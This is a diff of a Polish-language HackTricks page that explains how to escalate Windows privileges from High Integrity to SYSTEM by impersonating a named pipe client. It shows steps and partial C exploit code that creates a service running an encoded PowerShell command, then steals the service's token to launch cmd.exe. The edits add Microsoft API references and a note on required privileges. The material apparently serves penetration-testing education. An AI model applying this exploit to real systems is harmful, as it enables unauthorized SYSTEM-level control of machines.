@@ -1,16 +1,18 @@
-# From High Integrity to SYSTEM with Name Pipes
+# Od High Integrity do SYSTEM za pomocą Name Pipes
 
 {{#include ../../banners/hacktricks-training.md}}
 
 **Przebieg kodu:**
 
-1. Utwórz nowy Pipe.
-2. Utwórz i uruchom service, który połączy się z utworzonym pipe i coś zapisze. Kod service wykona ten zakodowany kod PS: `$pipe = new-object System.IO.Pipes.NamedPipeClientStream("piper"); $pipe.Connect(); $sw = new-object System.IO.StreamWriter($pipe); $sw.WriteLine("Go"); $sw.Dispose();`
-3. Service odbierze dane od klienta w pipe, wywoła `ImpersonateNamedPipeClient` i zaczeka na zakończenie service.
-4. Na koniec użyj tokena uzyskanego z service, aby uruchomić nowy _cmd.exe_.
+1. Utwórz serwer named pipe.
+2. Utwórz i uruchom usługę, która połączy się z utworzonym pipe'em i coś zapisze. Kod usługi wykona ten zakodowany kod PS: `$pipe = new-object System.IO.Pipes.NamedPipeClientStream("piper"); $pipe.Connect(); $sw = new-object System.IO.StreamWriter($pipe); $sw.WriteLine("Go"); $sw.Dispose();`
+3. Po połączeniu się usługi i zapisaniu danych wywołaj `ImpersonateNamedPipeClient`, otwórz token wynikowego wątku i zduplikuj go jako token podstawowy.<sup>[[1]](#references)</sup>
+4. Użyj tego tokena podstawowego do uruchomienia `cmd.exe`.<sup>[[2]](#references)</sup>
+
+Ta metoda zakłada, że wywołujący może utworzyć i uruchomić usługę oraz posiada uprawnienia wymagane przez `CreateProcessWithTokenW` (zwykle `SeImpersonatePrivilege`). Jest to technika eskalacji z High Integrity do SYSTEM, a nie mechanizm dostępny dla dowolnego użytkownika o niskich uprawnieniach.<sup>[[2]](#references)[[3]](#references)</sup>
 
 > [!WARNING]
-> Jeśli nie masz wystarczających uprawnień, exploit może się zawiesić i nigdy nie zwrócić wyniku.
+> Jeśli utworzenie usługi się nie powiedzie, przykładowy kod nie zasygnalizuje tego wątku pipe'a i może czekać bezterminowo. Przed użyciem w labie dodaj obsługę błędów i limity czasu.
 ```c
 #include <windows.h>
 #include <time.h>
@@ -35,7 +37,7 @@ return FALSE;
 // create Piper service
 scService = CreateServiceA(scManager, PIPESRV, PIPESRV, SERVICE_ALL_ACCESS, SERVICE_WIN32_OWN_PROCESS,
 SERVICE_DEMAND_START, SERVICE_ERROR_NORMAL,
-"C:\\Windows\\\System32\\cmd.exe /rpowershell.exe -EncodedCommand JABwAGkAcABlACAAPQAgAG4AZQB3AC0AbwBiAGoAZQBjAHQAIABTAHkAcwB0AGUAbQAuAEkATwAuAFAAaQBwAGUAcwAuAE4AYQBtAGUAZABQAGkAcABlAEMAbABpAGUAbgB0AFMAdAByAGUAYQBtACgAIgBwAGkAcABlAHIAIgApADsAIAAkAHAAaQBwAGUALgBDAG8AbgBuAGUAYwB0ACgAKQA7ACAAJABzAHcAIAA9ACAAbgBlAHcALQBvAGIAagBlAGMAdAAgAFMAeQBzAHQAZQBtAC4ASQBPAC4AUwB0AHIAZQBhAG0AVwByAGkAdABlAHIAKAAkAHAAaQBwAGUAKQA7ACAAJABzAHcALgBXAHIAaQB0AGUATABpAG4AZQAoACIARwBvACIAKQA7ACAAJABzAHcALgBEAGkAcwBwAG8AcwBlACgAKQA7AA==",
+"C:\\Windows\\System32\\cmd.exe /c powershell.exe -EncodedCommand JABwAGkAcABlACAAPQAgAG4AZQB3AC0AbwBiAGoAZQBjAHQAIABTAHkAcwB0AGUAbQAuAEkATwAuAFAAaQBwAGUAcwAuAE4AYQBtAGUAZABQAGkAcABlAEMAbABpAGUAbgB0AFMAdAByAGUAYQBtACgAIgBwAGkAcABlAHIAIgApADsAIAAkAHAAaQBwAGUALgBDAG8AbgBuAGUAYwB0ACgAKQA7ACAAJABzAHcAIAA9ACAAbgBlAHcALQBvAGIAagBlAGMAdAAgAFMAeQBzAHQAZQBtAC4ASQBPAC4AUwB0AHIAZQBhAG0AVwByAGkAdABlAHIAKAAkAHAAaQBwAGUAKQA7ACAAJABzAHcALgBXAHIAaQB0AGUATABpAG4AZQAoACIARwBvACIAKQA7ACAAJABzAHcALgBEAGkAcwBwAG8AcwBlACgAKQA7AA==",
 NULL, NULL, NULL, NULL, NULL);
 
 if (scService == NULL) {
@@ -117,4 +119,9 @@ RevertToSelf();
 return 0;
 }
 ```
+## References
+
+- [1] [Microsoft Learn — `ImpersonateNamedPipeClient`](https://learn.microsoft.com/en-us/windows/win32/api/namedpipeapi/nf-namedpipeapi-impersonatenamedpipeclient)
+- [2] [Microsoft Learn — `CreateProcessWithTokenW`](https://learn.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-createprocesswithtokenw)
+- [3] [Microsoft Learn — `CreateServiceA`](https://learn.microsoft.com/en-us/windows/win32/api/winsvc/nf-winsvc-createservicea)
 {{#include ../../banners/hacktricks-training.md}}
